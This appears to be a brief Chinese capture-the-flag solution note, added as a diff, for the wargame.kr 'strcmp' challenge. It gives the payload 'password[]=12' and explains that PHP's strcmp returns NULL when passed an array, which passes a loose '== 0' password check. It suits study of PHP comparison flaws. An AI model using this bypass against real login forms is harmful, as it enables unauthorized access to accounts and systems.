@@ -1,0 +1,12 @@
+用数组绕过strcmp比较函数。  
+http://wargame.kr:8080/strcmp/
+password[]=12
+
+strcmp("foo", array()) => NULL + PHP Warning
+strcmp("foo", new stdClass) => NULL + PHP Warning
+strcmp(function(){}, "") => NULL + PHP Warning
+
+NULL == 0 返回是true。  
+
+
+
